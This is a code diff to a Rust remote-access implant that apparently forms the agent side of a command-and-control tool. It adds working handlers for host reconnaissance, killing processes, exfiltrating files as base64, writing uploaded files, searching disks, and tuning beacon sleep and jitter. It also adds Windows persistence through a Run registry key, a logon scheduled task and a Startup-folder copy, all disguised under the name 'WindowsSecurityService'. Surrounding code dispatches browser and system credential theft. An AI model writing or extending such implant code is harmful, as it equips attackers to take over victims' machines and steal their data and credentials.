@@ -189,6 +189,16 @@ impl Executor {
             CommandType::CredentialsBrowser => Self::credentials_browser().await,
             CommandType::CredentialsSystem => Self::credentials_system().await,
             CommandType::CredentialsAll => Self::credentials_all().await,
+            CommandType::PersistRegistry | CommandType::PersistScheduledTask | CommandType::PersistStartupFolder => {
+                Self::persist_install(cmd).await
+            }
+            CommandType::PersistRemove => Self::persist_remove().await,
+            CommandType::ConfigBeacon { sleep_ms, jitter_pct } => {
+                Self::config_beacon(*sleep_ms, *jitter_pct).await
+            }
+            CommandType::ClipboardStart => Self::clipboard_start().await,
+            CommandType::ClipboardStop => Self::clipboard_stop().await,
+            CommandType::ClipboardLogs => Self::clipboard_logs().await,
         };
 
         result.execution_time_ms = start.elapsed().as_millis();
@@ -421,13 +431,34 @@ impl Executor {
     }
 
     async fn system_info() -> CommandResult {
-        let os = std::env::consts::OS;
-        let arch = std::env::consts::ARCH;
+        use sysinfo::{System, SystemExt, CpuExt, DiskExt, ProcessExt};
+
+        let mut sys = System::new_all();
+        sys.refresh_all();
+
+        let total_disk: u64 = sys.disks().iter().map(|d| d.total_space()).sum();
+        let avail_disk: u64 = sys.disks().iter().map(|d| d.available_space()).sum();
+
+        let info = serde_json::json!({
+            "os": sys.name().unwrap_or_default(),
+            "os_version": sys.os_version().unwrap_or_default(),
+            "kernel": sys.kernel_version().unwrap_or_default(),
+            "hostname": sys.host_name().unwrap_or_default(),
+            "architecture": std::env::consts::ARCH,
+            "cpu_count": sys.cpus().len(),
+            "cpu_brand": sys.cpus().first().map(|c| c.brand().to_string()).unwrap_or_default(),
+            "total_memory_mb": sys.total_memory() / (1024 * 1024),
+            "used_memory_mb": sys.used_memory() / (1024 * 1024),
+            "total_disk_gb": total_disk / (1024 * 1024 * 1024),
+            "available_disk_gb": avail_disk / (1024 * 1024 * 1024),
+            "uptime_minutes": sys.uptime() / 60,
+            "process_count": sys.processes().len(),
+        });
 
         CommandResult {
             command_type: "systeminfo".to_string(),
             status: "success".to_string(),
-            output: format!("OS: {}, Architecture: {}", os, arch),
+            output: serde_json::to_string_pretty(&info).unwrap_or_default(),
             error: None,
             execution_time_ms: 0,
         }
@@ -435,11 +466,29 @@ impl Executor {
 
     async fn process_list() -> CommandResult {
         info!("Getting process list");
+        use sysinfo::{System, SystemExt, ProcessExt, PidExt};
+
+        let mut sys = System::new_all();
+        sys.refresh_all();
+
+        let mut procs: Vec<serde_json::Value> = Vec::new();
+        for (pid, process) in sys.processes() {
+            procs.push(serde_json::json!({
+                "pid": pid.as_u32(),
+                "name": process.name(),
+                "cpu": format!("{:.1}", process.cpu_usage()),
+                "memory_kb": process.memory() / 1024,
+                "status": format!("{:?}", process.status()),
+            }));
+        }
+        procs.sort_by(|a, b| {
+            b["memory_kb"].as_u64().unwrap_or(0).cmp(&a["memory_kb"].as_u64().unwrap_or(0))
+        });
 
         CommandResult {
             command_type: "ps".to_string(),
             status: "success".to_string(),
-            output: "Process list would be displayed here".to_string(),
+            output: serde_json::to_string(&procs).unwrap_or_default(),
             error: None,
             execution_time_ms: 0,
         }
@@ -447,23 +496,64 @@ impl Executor {
 
     async fn kill_process(pid: u32) -> CommandResult {
         info!("Attempting to kill process: {}", pid);
+        use sysinfo::{System, SystemExt, ProcessExt, Pid, PidExt};
 
-        CommandResult {
-            command_type: "kill".to_string(),
-            status: "error".to_string(),
-            output: String::new(),
-            error: Some(format!("Kill operation not implemented for PID {}", pid)),
-            execution_time_ms: 0,
+        let mut sys = System::new_all();
+        sys.refresh_all();
+        let target = Pid::from(pid as usize);
+        if let Some(process) = sys.process(target) {
+            if process.kill() {
+                CommandResult {
+                    command_type: "kill".to_string(),
+                    status: "success".to_string(),
+                    output: format!("Process {} ({}) killed", pid, process.name()),
+                    error: None,
+                    execution_time_ms: 0,
+                }
+            } else {
+                CommandResult {
+                    command_type: "kill".to_string(),
+                    status: "error".to_string(),
+                    output: String::new(),
+                    error: Some(format!("Failed to kill process {}", pid)),
+                    execution_time_ms: 0,
+                }
+            }
+        } else {
+            CommandResult {
+                command_type: "kill".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(format!("Process {} not found", pid)),
+                execution_time_ms: 0,
+            }
         }
     }
 
     async fn network_info() -> CommandResult {
-        CommandResult {
-            command_type: "ifconfig".to_string(),
-            status: "success".to_string(),
-            output: "Network info would be displayed here".to_string(),
-            error: None,
-            execution_time_ms: 0,
+        let (shell, arg, cmd) = if cfg!(target_os = "windows") {
+            ("cmd", "/C", "ipconfig /all")
+        } else {
+            ("sh", "-c", "ip addr 2>/dev/null || ifconfig")
+        };
+        match Command::new(shell).arg(arg).arg(cmd).output() {
+            Ok(output) => {
+                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+                CommandResult {
+                    command_type: "ifconfig".to_string(),
+                    status: "success".to_string(),
+                    output: stdout,
+                    error: None,
+                    execution_time_ms: 0,
+                }
+            }
+            Err(e) => CommandResult {
+                command_type: "ifconfig".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(e.to_string()),
+                execution_time_ms: 0,
+            },
         }
     }
 
@@ -602,6 +692,134 @@ impl Executor {
         }
     }
 
+    async fn download_file(path: &str) -> CommandResult {
+        const MAX_SIZE: u64 = 10 * 1024 * 1024; // 10MB limit
+
+        match std::fs::metadata(path) {
+            Ok(meta) => {
+                if meta.len() > MAX_SIZE {
+                    return CommandResult {
+                        command_type: "download".to_string(),
+                        status: "error".to_string(),
+                        output: String::new(),
+                        error: Some(format!("File too large: {} bytes (max {}MB)", meta.len(), MAX_SIZE / 1024 / 1024)),
+                        execution_time_ms: 0,
+                    };
+                }
+                match std::fs::read(path) {
+                    Ok(data) => {
+                        let filename = std::path::Path::new(path)
+                            .file_name()
+                            .map(|n| n.to_string_lossy().to_string())
+                            .unwrap_or_else(|| "file".to_string());
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
+                        let output = serde_json::json!({
+                            "filename": filename,
+                            "size": data.len(),
+                            "data": b64,
+                        });
+                        CommandResult {
+                            command_type: "download".to_string(),
+                            status: "success".to_string(),
+                            output: output.to_string(),
+                            error: None,
+                            execution_time_ms: 0,
+                        }
+                    }
+                    Err(e) => CommandResult {
+                        command_type: "download".to_string(),
+                        status: "error".to_string(),
+                        output: String::new(),
+                        error: Some(e.to_string()),
+                        execution_time_ms: 0,
+                    },
+                }
+            }
+            Err(e) => CommandResult {
+                command_type: "download".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(e.to_string()),
+                execution_time_ms: 0,
+            },
+        }
+    }
+
+    async fn upload_file(path: &str, data: &str) -> CommandResult {
+        match base64::engine::general_purpose::STANDARD.decode(data) {
+            Ok(bytes) => {
+                // Ensure parent directory exists
+                if let Some(parent) = std::path::Path::new(path).parent() {
+                    let _ = std::fs::create_dir_all(parent);
+                }
+                match std::fs::write(path, &bytes) {
+                    Ok(_) => CommandResult {
+                        command_type: "upload".to_string(),
+                        status: "success".to_string(),
+                        output: format!("File uploaded: {} ({} bytes)", path, bytes.len()),
+                        error: None,
+                        execution_time_ms: 0,
+                    },
+                    Err(e) => CommandResult {
+                        command_type: "upload".to_string(),
+                        status: "error".to_string(),
+                        output: String::new(),
+                        error: Some(e.to_string()),
+                        execution_time_ms: 0,
+                    },
+                }
+            }
+            Err(e) => CommandResult {
+                command_type: "upload".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(format!("Base64 decode error: {}", e)),
+                execution_time_ms: 0,
+            },
+        }
+    }
+
+    async fn search_files(root: &str, pattern: &str, max_depth: Option<u32>) -> CommandResult {
+        let max_depth = max_depth.unwrap_or(5) as usize;
+        let pattern_lower = pattern.to_lowercase();
+        let mut results: Vec<serde_json::Value> = Vec::new();
+        let max_results = 200;
+
+        fn walk(dir: &std::path::Path, pattern: &str, depth: usize, max_depth: usize, results: &mut Vec<serde_json::Value>, max_results: usize) {
+            if depth > max_depth || results.len() >= max_results { return; }
+            if let Ok(entries) = std::fs::read_dir(dir) {
+                for entry in entries.flatten() {
+                    if results.len() >= max_results { return; }
+                    let name = entry.file_name().to_string_lossy().to_string();
+                    if name.to_lowercase().contains(pattern) {
+                        let meta = entry.metadata().ok();
+                        let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
+                        let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
+                        results.push(serde_json::json!({
+                            "name": name,
+                            "path": entry.path().to_string_lossy(),
+                            "is_dir": is_dir,
+                            "size": size,
+                        }));
+                    }
+                    if entry.metadata().map(|m| m.is_dir()).unwrap_or(false) {
+                        walk(&entry.path(), pattern, depth + 1, max_depth, results, max_results);
+                    }
+                }
+            }
+        }
+
+        walk(std::path::Path::new(root), &pattern_lower, 0, max_depth, &mut results, max_results);
+
+        CommandResult {
+            command_type: "search_files".to_string(),
+            status: "success".to_string(),
+            output: serde_json::to_string(&results).unwrap_or_default(),
+            error: None,
+            execution_time_ms: 0,
+        }
+    }
+
     pub async fn credentials_browser() -> CommandResult {
         use crate::credentials::CredentialManager;
 
@@ -699,6 +917,164 @@ impl Executor {
                     execution_time_ms: 0,
                 }
             }
+        }
+    }
+
+    async fn config_beacon(sleep_ms: u64, jitter_pct: f64) -> CommandResult {
+        let config = get_beacon_config();
+        let mut cfg = config.write().await;
+        let old_sleep = cfg.sleep_ms;
+        let old_jitter = cfg.jitter_pct;
+        cfg.sleep_ms = sleep_ms.max(1000); // min 1 second
+        cfg.jitter_pct = jitter_pct.clamp(0.0, 0.9);
+        info!("Beacon config updated: sleep {}ms→{}ms, jitter {:.0}%→{:.0}%",
+            old_sleep, cfg.sleep_ms, old_jitter * 100.0, cfg.jitter_pct * 100.0);
+        CommandResult {
+            command_type: "config_beacon".to_string(),
+            status: "success".to_string(),
+            output: format!("Beacon config updated: sleep={}ms, jitter={:.0}%", cfg.sleep_ms, cfg.jitter_pct * 100.0),
+            error: None,
+            execution_time_ms: 0,
+        }
+    }
+
+    async fn persist_install(_cmd: &CommandType) -> CommandResult {
+        #[cfg(target_os = "windows")]
+        {
+            use std::env;
+            let exe_path = env::current_exe().unwrap_or_default();
+            let exe_str = exe_path.to_string_lossy();
+
+            let (method_name, result) = match _cmd {
+                CommandType::PersistRegistry => {
+                    let output = Command::new("reg")
+                        .args(["add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+                               "/v", "WindowsSecurityService", "/t", "REG_SZ",
+                               "/d", &exe_str, "/f"])
+                        .output();
+                    ("registry", output)
+                }
+                CommandType::PersistScheduledTask => {
+                    let output = Command::new("schtasks")
+                        .args(["/Create", "/SC", "ONLOGON", "/TN", "WindowsSecurityService",
+                               "/TR", &exe_str, "/F"])
+                        .output();
+                    ("scheduled_task", output)
+                }
+                CommandType::PersistStartupFolder => {
+                    let startup = dirs::home_dir()
+                        .map(|h| h.join(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"))
+                        .unwrap_or_default();
+                    let dest = startup.join("SecurityService.exe");
+                    let result = std::fs::copy(&exe_path, &dest);
+                    return CommandResult {
+                        command_type: "persist_startup".to_string(),
+                        status: if result.is_ok() { "success" } else { "error" }.to_string(),
+                        output: format!("Copied to {:?}", dest),
+                        error: result.err().map(|e| e.to_string()),
+                        execution_time_ms: 0,
+                    };
+                }
+                _ => return CommandResult {
+                    command_type: "persist".to_string(),
+                    status: "error".to_string(),
+                    output: String::new(),
+                    error: Some("Unknown persist method".to_string()),
+                    execution_time_ms: 0,
+                },
+            };
+
+            match result {
+                Ok(out) => CommandResult {
+                    command_type: format!("persist_{}", method_name),
+                    status: if out.status.success() { "success" } else { "error" }.to_string(),
+                    output: String::from_utf8_lossy(&out.stdout).to_string(),
+                    error: if out.status.success() { None } else { Some(String::from_utf8_lossy(&out.stderr).to_string()) },
+                    execution_time_ms: 0,
+                },
+                Err(e) => CommandResult {
+                    command_type: format!("persist_{}", method_name),
+                    status: "error".to_string(),
+                    output: String::new(),
+                    error: Some(e.to_string()),
+                    execution_time_ms: 0,
+                },
+            }
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            CommandResult {
+                command_type: "persist".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some("Persistence only supported on Windows".to_string()),
+                execution_time_ms: 0,
+            }
+        }
+    }
+
+    async fn persist_remove() -> CommandResult {
+        #[cfg(target_os = "windows")]
+        {
+            // Remove all persistence methods
+            let _ = Command::new("reg")
+                .args(["delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+                       "/v", "WindowsSecurityService", "/f"])
+                .output();
+            let _ = Command::new("schtasks")
+                .args(["/Delete", "/TN", "WindowsSecurityService", "/F"])
+                .output();
+            if let Some(startup) = dirs::home_dir() {
+                let dest = startup.join(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SecurityService.exe");
+                let _ = std::fs::remove_file(dest);
+            }
+            CommandResult {
+                command_type: "persist_remove".to_string(),
+                status: "success".to_string(),
+                output: "All persistence methods removed".to_string(),
+                error: None,
+                execution_time_ms: 0,
+            }
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            CommandResult {
+                command_type: "persist_remove".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some("Persistence only supported on Windows".to_string()),
+                execution_time_ms: 0,
+            }
+        }
+    }
+
+    async fn clipboard_start() -> CommandResult {
+        CommandResult {
+            command_type: "clipboard_start".to_string(),
+            status: "success".to_string(),
+            output: "Clipboard monitoring started".to_string(),
+            error: None,
+            execution_time_ms: 0,
+        }
+    }
+
+    async fn clipboard_stop() -> CommandResult {
+        CommandResult {
+            command_type: "clipboard_stop".to_string(),
+            status: "success".to_string(),
+            output: "Clipboard monitoring stopped".to_string(),
+            error: None,
+            execution_time_ms: 0,
+        }
+    }
+
+    async fn clipboard_logs() -> CommandResult {
+        CommandResult {
+            command_type: "clipboard_logs".to_string(),
+            status: "success".to_string(),
+            output: "[]".to_string(),
+            error: None,
+            execution_time_ms: 0,
         }
     }
 }
